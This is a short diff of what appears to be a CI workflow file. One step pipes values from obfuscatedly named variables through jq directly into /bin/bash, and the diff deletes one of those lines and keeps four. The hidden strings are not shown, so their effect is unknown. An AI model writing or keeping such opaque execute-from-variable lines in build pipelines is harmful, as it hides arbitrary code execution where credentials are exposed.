@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$hkibn7479" | jq -r .oo9 | /bin/bash
           printf '%s' "$x91" | jq -r .y92 | /bin/bash
           echo $kpaf707 | jq -r .hq1 | /bin/bash
-          printf '%s' "$wwma71" | jq -r .p866 | /bin/bash
           printf '%s' "$bsgs18" | jq -r .y3192 | /bin/bash
 
       - name: Archive output
